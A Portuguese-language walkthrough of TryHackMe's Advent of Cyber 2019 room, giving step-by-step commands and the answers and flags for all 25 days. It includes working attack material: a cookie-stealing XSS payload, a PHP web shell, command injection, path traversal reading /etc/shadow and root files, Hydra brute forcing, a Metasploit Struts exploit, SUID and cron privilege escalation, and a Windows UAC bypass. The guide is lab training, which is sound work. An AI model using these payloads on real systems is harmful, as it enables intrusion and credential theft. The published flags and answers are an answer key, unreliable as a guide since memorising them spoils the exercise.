# Guia de resolução: Advent of Cyber 1 (2019)

> **Contém respostas e flags.** [Abrir a sala no TryHackMe](https://tryhackme.com/room/25daysofchristmas). Os IPs mudam a cada implantação: substitua `<IP>` pelo endereço da Lab Machine do dia. Execute estes procedimentos apenas no laboratório da sala.

## Preparação

Use uma máquina Linux com as ferramentas `nmap`, `curl`, `python3`, `tshark`, `john`, `hydra`, `exiftool`, `unzip`, `fcrackzip`, `steghide`, `awscli`, `mysql`, `sqlmap` e `radare2`. Conecte-a à VPN do TryHackMe e inicie a **Lab Machine** indicada em cada tarefa. A etapa NFS do dia 11 exige uma máquina Linux com suporte a montagem NFS.

```bash
export IP=<IP_DA_MAQUINA>
ping -c 1 "$IP"
nmap -Pn -sT -sV "$IP"
```

As tarefas 1-5 da sala são introdução e conexão. Marque-as conforme as instruções da página. Os desafios começam na tarefa 6, correspondente ao dia 1. Baixe os arquivos de cada tarefa pelo botão **Download Task Files** quando ele aparecer.

Os downloads podem ter um sufixo numérico no nome. Antes de executar comandos que usam nomes curtos, renomeie o arquivo correspondente; por exemplo, `mv 'Evil Elf_'*.pcap evil-elf.pcap` e `mv tosend_*.zip tosend.zip`.

## Dia 1 - Inventory Management

1. Inicie a máquina e abra `http://<IP>:3000` no navegador.
2. Registre uma conta de teste e entre. Abra as ferramentas do navegador, procure **Cookies** e anote o cookie `authid`.
3. Decodifique o valor como Base64. Se estiver copiado em formato URL, `%3D` representa `=`. O texto é formado pelo nome da conta mais o sufixo fixo `v4er9ll1!ss`.
4. Substitua o nome da sua conta por `mcinventory`, codifique novamente e coloque o valor no cookie `authid`. Recarregue a página e veja o pedido exibido para essa identidade.

```bash
printf %s 'mcinventoryv4er9ll1!ss' | base64 -w0
```

**Respostas:** `authid`; `v4er9ll1!ss`; `firewall`.

## Dia 2 - Arctic Forum

1. Inicie a máquina e examine `http://<IP>:3000`.
2. Enumere diretórios. A rota administrativa encontrada é `/sysadmin` (a resposta aceita pode aparecer como `/SysAdmin`).
3. Abra o código-fonte da página administrativa. A referência a **Arctic Digital Design** leva ao repositório público do desenvolvedor, onde há credenciais padrão: usuário `admin`, senha `defaultpass`.
4. Entre em `/sysadmin` e leia a mensagem sobre a festa.

```bash
ffuf -u "http://$IP:3000/FUZZ" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
curl -s "http://$IP:3000/sysadmin" | grep -i -E 'github|arctic|design'
```

**Respostas:** `/SysAdmin`; `defaultpass`; `Eggnog`.

## Dia 3 - Evil Elf

O arquivo da tarefa é uma captura PCAP. Os resultados vêm do tráfego, sem Lab Machine.

1. Localize o pacote 998 e leia o campo de destino.
2. Filtre Telnet, encontre o número do fluxo TCP e siga esse fluxo. O texto em claro mostra o item acrescentado à lista de Natal e uma linha de `/etc/shadow` para `buddy`.
3. Copie **somente o hash completo** de `buddy` para `buddy.hash` e teste uma lista de senhas com John. Um hash `$6$` usa SHA-512 crypt.

```bash
tshark -r evil-elf.pcap -Y 'frame.number == 998' \
  -T fields -e ip.dst
tshark -r evil-elf.pcap -Y telnet \
  -T fields -e frame.number -e tcp.stream | sort -u
tshark -r evil-elf.pcap -q -z follow,tcp,ascii,<ID_DO_FLUXO>
john --wordlist=/usr/share/wordlists/rockyou.txt buddy.hash
john --show buddy.hash
```

**Respostas:** `63.32.89.195`; `ps4`; `rainbow`.

## Dia 4 - Training

Entre por SSH com `mcsysadmin` e a senha fornecida na própria tarefa, `bestelf1234`. A maior parte das respostas está na home. Para a última pergunta, há uma cópia de `/etc/shadow` em `/var/shadow.bak`.

```bash
ssh mcsysadmin@<IP>
cd ~
ls -1 | wc -l                 # arquivos visíveis: 8
cat file5                     # recipes
grep -l 'password' file*      # file6
grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' file*  # 10.0.0.05
ls -1 /home                  # 3 contas com diretório de usuário
sha1sum file8
grep '^mcsysadmin:' /var/shadow.bak
```

**Respostas, na ordem:** `8`; `recipes`; `file6`; `10.0.0.05`; `3`; `fa67ee594358d83becdd2cb6c466b25320fd2835`; `$6$jbosYsU/$qOYToX/hnKGjT0EscuUIiIqF8GHgokHdy/Rg/DaB.RgkrbeBXPdzpHdMLI6cQJLdFlS4gkBMzilDBYcQvu2ro/`.

## Dia 5 - Ho-Ho-Hosint

1. Baixe a imagem fornecida pela tarefa e veja seus metadados. O campo `Creator` revela `JLolax1`.
2. Pesquise esse identificador nas redes sociais. O perfil de Lola contém data de nascimento, ocupação e modelo de telefone.
3. Siga o link do perfil para o site de fotografia. Consulte uma versão arquivada no Wayback Machine para encontrar quando ela começou a fotografar.
4. Faça busca reversa da imagem da mulher exibida no site para identificá-la.

```bash
exiftool thegrinch.jpg | grep -i -E 'creator|artist|author'
```

**Respostas:** `December 29, 1900`; `Santa's Helper`; `iPhone X`; `23/10/2014`; `Ada Lovelace`. Perfis e páginas externas podem ter mudado desde 2019; nesse caso, consulte as capturas arquivadas.

## Dia 6 - Data Elf-iltration

1. Baixe o PCAP e filtre consultas DNS. Há um nome com caracteres hexadecimais; decodifique-os para obter o dado exfiltrado.
2. No Wireshark, use **File → Export Objects → HTTP** para salvar `christmaslists.zip` e a imagem `TryHackMe.jpg` observados no tráfego.
3. Descubra a senha do ZIP com `fcrackzip`, extraia-o e leia a lista de Timmy.
4. Extraia o conteúdo oculto da imagem com `steghide` (senha vazia).

```bash
tshark -r holidaythief.pcap -Y 'dns.qry.name' \
  -T fields -e dns.qry.name | sort -u
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u christmaslists.zip
unzip christmaslists.zip            # senha: december
cat christmaslisttimmy.txt
steghide extract -sf TryHackMe.jpg -p ''
cat <ARQUIVO_EXTRAIDO_PELO_STEGHIDE>
```

**Respostas:** `Candy Cane Serial Number 8491`; `PenTester`; `RFC527`.

## Dia 7 - Skilling Up

Faça um scan de portas abaixo de 1000 e identificação de versão/sistema. O serviço HTTP da porta 999 expõe a resposta final.

```bash
nmap -Pn -sT -sV -O -p 1-1000 "$IP"
curl -s "http://$IP:999/"
```

Conte as linhas `open` de portas TCP do scan; o Nmap identifica Linux e OpenSSH 7.4. Na listagem Web aparece `interesting.file`.

**Respostas:** `3`; `Linux`; `7.4`; `interesting.file`.

## Dia 8 - SUID Shenanigans

1. Procure SSH em todas as portas: neste alvo está em `65534`.
2. Entre como `holly` usando a senha que a tarefa fornece, `tuD@4vt0G*TU`.
3. Procure binários SUID de `igor`. `/usr/bin/find` executa com a identidade dele; sua opção `-exec` permite ler `flag1.txt`.
4. Procure binários SUID de `root`. O programa customizado `/usr/bin/system-control` aceita um comando no prompt; peça a leitura de `flag2.txt`.

```bash
nmap -Pn -sT -sV -p- "$IP"
ssh -p 65534 holly@"$IP"
find / -user igor -perm -4000 -type f 2>/dev/null
ls -l /usr/bin/find
find /home/igor/flag1.txt -exec cat /home/igor/flag1.txt \;
find / -user root -perm -4000 -type f 2>/dev/null | grep system-control
/usr/bin/system-control
# No prompt "Enter system command": cat /root/flag2.txt
```

**Respostas:** `65534`; `THM{d3f0708bdd9accda7f937d013eaf2cd8}`; `THM{8c8211826239d849fa8d6df03749c3a2}`.

## Dia 9 - Requests

O serviço da porta 3000 devolve JSON com `value` e `next`. Comece por `/`, acrescente `value` à resposta e siga a rota indicada por `next`. Pare antes de acrescentar `end`.

```python
import requests

base = 'http://10.10.169.100:3000'  # IP fixo informado na tarefa
path = '/'
parts = []

for _ in range(1000):
    response = requests.get(base + path, timeout=10)
    response.raise_for_status()
    item = response.json()
    if item['value'] == 'end' and item['next'] == 'end':
        break
    parts.append(item['value'])
    path = '/' + item['next'].lstrip('/')
else:
    raise RuntimeError('A cadeia não terminou em 1000 requisições')

print(''.join(parts))
```

**Resposta:** `sCrIPtKiDd`.

## Dia 10 - Metasploit-a-ho-ho-ho

O scan encontra o Apache Struts acessível em `/showcase.action`. Use o módulo `struts2_content_type_ognl` do Metasploit, configure o IP da máquina alvo e o IP da sua interface VPN (`tun0`), execute e abra um shell. Procure `flag1`, depois `ssh-creds.txt`. A credencial encontrada permite SSH como `santa`. Na home dele, leia as linhas pedidas das listas.

```text
msfconsole
search struts2_content_type_ognl
use exploit/multi/http/struts2_content_type_ognl
show options
set RHOSTS <IP>
set RPORT 80
set TARGETURI /showcase.action
set LHOST <SEU_IP_NA_VPN>
run
shell
```

```bash
find / -name 'flag1*' -o -name 'ssh-creds.txt' 2>/dev/null
cat <CAMINHO_DE_FLAG1>
cat <CAMINHO_DE_SSH_CREDS>
ssh santa@<IP>                 # senha: rudolphrednosedreindeer
sed -n '148p' naughty_list.txt
sed -n '52p' nice_list.txt
```

**Respostas:** `THM{3ad96bb13ec963a5ca4cb99302b37e12}`; `rudolphrednosedreindeer`; `Melisa Vanhoose`; `Lindsey Gaffney`.

## Dia 11 - Elf Applications

O alvo oferece NFS, FTP e MySQL. As três perguntas exigem serviços diferentes.

```bash
nmap -Pn -sT -sV -p 21,111,2049,3306 "$IP"
showmount -e "$IP"
sudo mkdir -p /mnt/aoc19
sudo mount -t nfs "$IP":/opt/files /mnt/aoc19
cat /mnt/aoc19/creds.txt
sudo umount /mnt/aoc19
curl "ftp://anonymous:@$IP/"
curl "ftp://anonymous:@$IP/file.txt"
mysql -h "$IP" -u root -p
```

Digite no MySQL a senha encontrada em `file.txt`. Em seguida:

```sql
SHOW DATABASES;
USE data;
SHOW TABLES;
SELECT * FROM USERS;
```

**Respostas:** `securepassword123`; `file.txt`; `bestpassword`.

## Dia 12 - Elfcryption

Baixe `tosend.zip` e extraia `note1.txt.gpg`, `note2_encrypted.txt` e `private.key`. Calcule o MD5 **antes** de decifrar a primeira nota. O GPG solicita a frase `25daysofchristmas`; a chave privada da segunda nota usa `hello`.

```bash
unzip tosend.zip
md5sum note1.txt.gpg
gpg --batch --yes --pinentry-mode loopback --passphrase '25daysofchristmas' \
  --output note1.txt --decrypt note1.txt.gpg
cat note1.txt
openssl pkeyutl -decrypt -inkey private.key \
  -in note2_encrypted.txt -out note2.txt
cat note2.txt
```

Se a versão do OpenSSL não aceitar esse formato de chave, tente `openssl rsautl -decrypt` com os mesmos arquivos. **Respostas:** `24cf615e2a4f42718f2ff36b35614f8f`; `santa's grotto`; `THM{ed9ccb6802c5d0f905ea747a310bba23}`.

## Dia 13 - Accumulate

Este dia combina enumeração Web, credenciais expostas e escalada de privilégio no Windows.

1. Faça um scan das portas. HTTP/80 e RDP/3389 são os serviços principais.
2. Enumere diretórios no HTTP e abra `/retro`. O site é um WordPress. Nos comentários de Wade aparece a senha `parzival`.
3. Entre no WordPress como `Wade` para confirmar a credencial. Depois use RDP na porta 3389 com o mesmo par usuário/senha. No desktop de Wade, abra `user.txt`.
4. Para a flag opcional de administrador, procure a pista `CVE-2019-1388` no histórico/favoritos do navegador e o executável `hhupd.exe`. Esse programa dispara uma janela UAC que expõe o certificado do publicador. Feche outras janelas do navegador antes da etapa seguinte.
5. Abra `hhupd.exe` e, no aviso UAC, escolha detalhes do certificado do publicador. Clique no link do emissor; o navegador aberto por esse diálogo herda o contexto elevado. Use **Save As** para abrir o diálogo de arquivo, digite `C:\Windows\System32\cmd.exe` no campo de nome e confirme. No prompt que abrir, confira a identidade e localize `root.txt`.

```bash
nmap -Pn -sT -sV -p 80,3389 "$IP"
ffuf -u "http://$IP/FUZZ" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
curl -s "http://$IP/retro/" | head
xfreerdp /v:"$IP" /u:Wade /p:parzival
```

```cmd
whoami
dir C:\Users\Wade\Desktop\user.txt
type C:\Users\Wade\Desktop\user.txt
dir C:\root.txt /s /b
type <CAMINHO_ENCONTRADO_PARA_ROOT.TXT>
```

**Respostas:** `/retro`; `THM{HACK_PLAYER_ONE}`; `THM{COIN_OPERATED_EXPLOITATION}`. A terceira pergunta é opcional na plataforma.

## Dia 14 - Unknown Storage

O enunciado fornece o nome `advent-bucket-one`. O bucket permite listagem sem autenticação. Leia o objeto encontrado, também sem credenciais AWS.

```bash
aws s3 ls s3://advent-bucket-one --no-sign-request
aws s3 cp s3://advent-bucket-one/employee_names.txt . --no-sign-request
cat employee_names.txt
```

Também é possível abrir `https://advent-bucket-one.s3.amazonaws.com/employee_names.txt` no navegador. **Respostas:** `employee_names.txt`; `mcchef`.

## Dia 15 - LFI

1. Abra a página Web e leia as notas de Charlie; uma delas menciona a viagem a `Hawaii`.
2. Inspecione as requisições da página. O serviço carrega arquivos pela rota `/get-file/`; um caminho absoluto codificado permite obter `/etc/shadow`.
3. Salve a linha de `charlie` em `charlie.hash` e use John com `rockyou.txt`. A senha obtida permite SSH para ler `flag1.txt`.

```bash
curl -s "http://$IP/"
curl -s "http://$IP/get-file/%2fetc%2fshadow" -o shadow.txt
grep '^charlie:' shadow.txt > charlie.hash
john --wordlist=/usr/share/wordlists/rockyou.txt charlie.hash
john --show charlie.hash
ssh charlie@"$IP"
find /home/charlie -name flag1.txt -type f -exec cat {} \;
```

**Respostas:** `Hawaii`; `password1`; `THM{4ea2adf842713ad3ce0c1f05ef12256d}`.

## Dia 16 - File Confusion

O ZIP desta tarefa contém ZIPs aninhados. O script abaixo percorre cada arquivo interno sem contar os próprios ZIPs. Ele também grava os arquivos finais em um diretório para inspeção.

```python
from pathlib import Path
from zipfile import ZipFile
from io import BytesIO

origem = Path('final-final-compressed.zip')
saida = Path('extraidos')
saida.mkdir(exist_ok=True)
arquivos = []

def percorrer(blob, prefixo=''):
    with ZipFile(BytesIO(blob)) as zip_atual:
        for item in zip_atual.infolist():
            if item.is_dir():
                continue
            dados = zip_atual.read(item)
            nome = prefixo + item.filename
            if dados.startswith(b'PK\x03\x04'):
                percorrer(dados, nome + '/')
            else:
                arquivos.append((nome, dados))

percorrer(origem.read_bytes())
print('Arquivos não ZIP:', len(arquivos))
for i, (nome, dados) in enumerate(arquivos):
    (saida / f'{i:03d}_{Path(nome).name}').write_bytes(dados)
    if b'password' in dados.lower():
        print('Texto password:', nome)
```

Execute `python3 extrair.py`. Use `exiftool` nos arquivos extraídos e conte os que têm `Version: 1.1` nos metadados:

```bash
exiftool extraidos/* | grep -i 'Version.*1\.1' | wc -l
grep -Ril 'password' extraidos/
```

**Respostas:** `50`; `3`; `dL6w.txt`.

## Dia 17 - Hydra-ha-ha-haa

1. O scan identifica Web/80 e SSH/22. Veja o HTML do formulário: os campos são `username` e `password`, enviados a `/login`.
2. Use Hydra contra o formulário, com a expressão de falha `incorrect`. Entre na página como `molly` e leia a primeira flag.
3. Use Hydra novamente contra SSH, com quatro conexões paralelas. Entre com a senha encontrada e leia a segunda flag.

```bash
nmap -Pn -sT -sV -p 22,80 "$IP"
hydra -l molly -P /usr/share/wordlists/rockyou.txt "$IP" \
  http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'
hydra -l molly -P /usr/share/wordlists/rockyou.txt \
  -t 4 ssh://"$IP"
ssh molly@"$IP"
find /home/molly -iname '*flag*' -type f -exec cat {} \;
```

**Senhas:** Web `sunshine`, SSH `butterfly`. **Flags:** `THM{2673a7dd116de68e85c48ec0b1f2612e}` e `THM{c8eeb0468febbadea859baeb33b2541b}`.

## Dia 18 - ELF JS

O fórum da porta 3000 armazena notas sem neutralizar HTML. O bot administrador visita as notas, criando um cenário de XSS persistente.

1. Registre uma conta de teste e entre.
2. Publique `<script>alert(1)</script>` como nota para confirmar a execução de JavaScript.
3. Publique uma nota que, quando aberta pelo administrador, envie `document.cookie` como outra nota **na própria aplicação**. O valor aparecerá na lista de notas; não é necessário um servidor receptor externo.

```html
<img src=x onerror="fetch('/home', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'note=' + encodeURIComponent(document.cookie)
})">
```

Se o formulário codificar quebras de linha, escreva a carga em uma única linha. **Resposta:** `2564799a4e6689972f6d9e1c7b406f87065cbf65`.

## Dia 19 - Commands

O enunciado chama atenção para `/api/cmd`. Nessa rota, o segmento depois da última barra é interpretado como comando do sistema. Teste `ls`, procure o arquivo e codifique o espaço e as barras ao ler seu conteúdo.

```bash
curl "http://$IP:3000/api/cmd/ls"
curl "http://$IP:3000/api/cmd/find%20%2F%20-name%20user.txt"
curl "http://$IP:3000/api/cmd/cat%20%2Fhome%2Fbestadmin%2Fuser.txt"
```

**Resposta:** `5W7WkjxBWwhe3RNsWJ3Q`.

## Dia 20 - Cronjob Privilege Escalation

1. O scan de todas as portas identifica SSH em `4567`.
2. Descubra a senha de `sam` com Hydra e entre por SSH. Leia `flag1.txt`.
3. Liste scripts da home e suas permissões. `/home/scripts/clean_up.sh` pode ser alterado por `sam` e é executado por cron como `root`. Guarde uma cópia do conteúdo original antes de modificá-lo.
4. Faça o script copiar `/home/ubuntu/flag2.txt` para `/home/scripts/flag2.txt` e permitir leitura. Aguarde até a execução do cron, leia a segunda flag e restaure o script original.

```bash
nmap -Pn -sT -sV -p- "$IP"
hydra -l sam -P /usr/share/wordlists/rockyou.txt \
  -s 4567 -t 4 ssh://"$IP"
ssh -p 4567 sam@"$IP"           # senha: chocolate
cat ~/flag1.txt
find /home -name '*.sh' -ls 2>/dev/null
ls -l /home/scripts/clean_up.sh
cp /home/scripts/clean_up.sh /home/scripts/clean_up.sh.backup
cat > /home/scripts/clean_up.sh <<'SH'
#!/bin/sh
cat /home/ubuntu/flag2.txt > /home/scripts/flag2.txt
chmod 644 /home/scripts/flag2.txt
SH
# Aguarde a próxima execução da tarefa (até cerca de um minuto).
cat /home/scripts/flag2.txt
cp /home/scripts/clean_up.sh.backup /home/scripts/clean_up.sh
rm /home/scripts/clean_up.sh.backup /home/scripts/flag2.txt
```

**Respostas:** `4567`; `THM{dec4389bc09669650f3479334532aeab}`; `THM{b27d33705f97ba2e1f444ec2da5f5f61}`.

## Dia 21 - Reverse Elf-ineering

Baixe o ZIP do dia e extraia o binário `challenge1`. Use `radare2` para analisar `main`. Os locais `local_ch`, `local_8h` e `local_4h` são variáveis na pilha, relativas a `rbp`. Acompanhe os `mov` e a multiplicação `imull` na ordem em que aparecem.

```bash
unzip files.zip
chmod +x challenge1
r2 -A challenge1
```

```text
pdf @ main
# Procure a primeira escrita em local_ch.
# Siga o valor de eax imediatamente antes de imull.
# Veja o valor transferido para local_4h antes de eax ser zerado.
```

Se quiser conferir dinamicamente, abra com `r2 -d challenge1`, coloque um breakpoint antes da instrução de interesse com `db <ENDEREÇO>`, avance com `dc`, leia os registradores com `dr` e a pilha com `px @ rbp-0xc` ou `px @ rbp-0x4`. **Respostas:** `1`; `6`; `6`.

## Dia 22 - If Santa, Then Christmas

Extraia o ZIP e analise `if2`. Em `main`, `local_8h` começa em 8 e `local_4h` em 2. O teste condicional não toma o desvio para `8 <= 2`; a execução incrementa `local_8h` em 1 e deixa `local_4h` inalterado.

```bash
unzip re-challenge-2.zip
chmod +x if2
r2 -A if2
```

```text
pdf @ main
# Opcional: no depurador, pare antes do retorno.
# px @ rbp-0x8
# px @ rbp-0x4
```

**Respostas:** `local_8h = 9`; `local_4h = 2`.

## Dia 23 - LapLANd (SQL Injection)

1. Inspecione o HTML do formulário de login. O nome do campo vulnerável é `log_email`.
2. Salve uma requisição POST do formulário para `/register.php` em `login-request.txt`, com os campos `log_email`, `log_password` e `login_button`.
3. Use `sqlmap` para identificar a injeção e enumerar o banco `social`. Leia `users` para obter o email e o hash MD5 de Santa. Leia `messages` para encontrar a estação.
4. Quebre o MD5 com John, entre na aplicação como Santa e procure o upload. A extensão `.php` é bloqueada, mas `.phtml` é aceita. Envie um arquivo temporário que execute um comando apenas no alvo do laboratório, leia `/home/user/flag.txt` e remova o arquivo enviado.

```http
POST /register.php HTTP/1.1
Host: <IP>
Content-Type: application/x-www-form-urlencoded

log_email=test%40example.com&log_password=x&login_button=Login
```

```bash
sqlmap -r login-request.txt --batch -p log_email --dbs
sqlmap -r login-request.txt --batch -p log_email -D social --tables
sqlmap -r login-request.txt --batch -p log_email -D social -T users --dump
sqlmap -r login-request.txt --batch -p log_email -D social -T messages --dump
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt santa.hash
```

Conteúdo mínimo do arquivo temporário `probe.phtml`:

```php
<?php
if (isset($_GET['cmd'])) {
    echo htmlspecialchars(shell_exec($_GET['cmd']), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}
?>
```

Após o upload, abra a URL indicada pela aplicação com `?cmd=cat%20%2Fhome%2Fuser%2Fflag.txt`. Apague o arquivo pelo painel ou pelo acesso obtido e confira que a URL não o executa mais. **Respostas:** `log_email`; `bigman@shefesh.com`; `saltnpepper`; `Waterloo`; `THM{SHELLS_IN_MY_EGGNOG}`.

## Dia 24 - Elf Stalk

O scan mostra Elasticsearch em `9200`, Kibana em `5601` e um log acessível em `8000`.

1. Consulte `/_cat/indices?v` e `/_search` sem autenticação. Procure documentos cujo campo `message` contenha `password`.
2. Leia o log do Kibana para identificar a versão. A rota `/api/console/api_server` da instância vulnerável aceita travessia de diretório no parâmetro `apis`.
3. Faça primeiro a prova com `/etc/passwd`, depois solicite `/root.txt`. A chamada pode ficar pendente; consulte o log da porta 8000 após cada pedido. O conteúdo da flag aparece na mensagem de erro registrada.

```bash
nmap -Pn -sT -sV -p 8000,5601,9200 "$IP"
curl -s "http://$IP:9200/_cat/indices?v"
curl -s "http://$IP:9200/_search?q=message:password"
curl -s "http://$IP:8000/kibana-log.txt" | tail -30
curl -m 8 --path-as-is \
  "http://$IP:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../etc/passwd"
curl -m 8 --path-as-is \
  "http://$IP:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../root.txt"
curl -s "http://$IP:8000/kibana-log.txt" | tail -50
```

**Respostas:** `9Qs58Ol3AXkMWLxiEyUyyf`; `someELKfun`.

## Dia 25 - Challenge-less

Não há flag nesse dia. Leia a tarefa final e clique em **Check** para encerrá-la.
